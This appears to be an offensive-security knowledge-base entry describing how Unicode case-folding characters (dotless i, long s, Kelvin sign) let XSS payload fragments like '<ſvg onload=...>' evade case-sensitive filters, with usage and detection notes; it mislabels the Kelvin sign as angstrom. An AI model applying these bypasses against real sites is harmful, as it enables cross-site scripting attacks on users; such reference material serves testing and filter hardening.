---
type: code
language: javascript
verified: true
tags:
  - xss
  - unicode-bypass
  - case-evasion
platforms:
  - web-applications
  - javascript
validated: true
---

# case-sensitive-unicode-bypass-transformations

## Code

```javascript
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%C5%BF) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k

<ſvg onload=... > become <SVG ONLOAD=...>
<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
```

## Description

This snippet shows Unicode characters that alter case during processing, allowing evasion of case-sensitive filters. For instance, using ſ (which uppercases to S) in 'svg' creates <ſvg> that becomes <SVG>, bypassing lowercase-only blocks while maintaining tag functionality for XSS execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| %C4%B0 | Encoding for dotted I (İ), lowercases to i | Used in tag names like 'input' |
| %C4%B1 | Encoding for dotless i (ı), uppercases to I | For 'iframe' variants |
| %C5%BF | Encoding for long s (ſ), uppercases to S | Transforms 'svg' to 'SVG' |
| %E2%84%AA | Encoding for angstrom (K), lowercases to k | For attributes like 'onload' |

## Usage

Apply these in payloads where case matters, e.g., <ıframe> becomes <IFRAME> post-uppercase. Test in JavaScript contexts or HTML inputs to confirm execution of onload events despite filter mismatches.

## Detection

- Log analysis for rare Unicode chars (%C4, %C5, %E2%) in inputs.
- Case-insensitive matching in WAF rules combined with normalization.
- CSP headers to block uppercase/lowercase script variants.
- Static analysis tools scanning for .toUpperCase() or .toLowerCase() in client-side code.

## Related

- [[procedures/Unicode-Filter-Bypass-for-XSS]]
- [[commands/curl-test-unicode-xss-payload]]
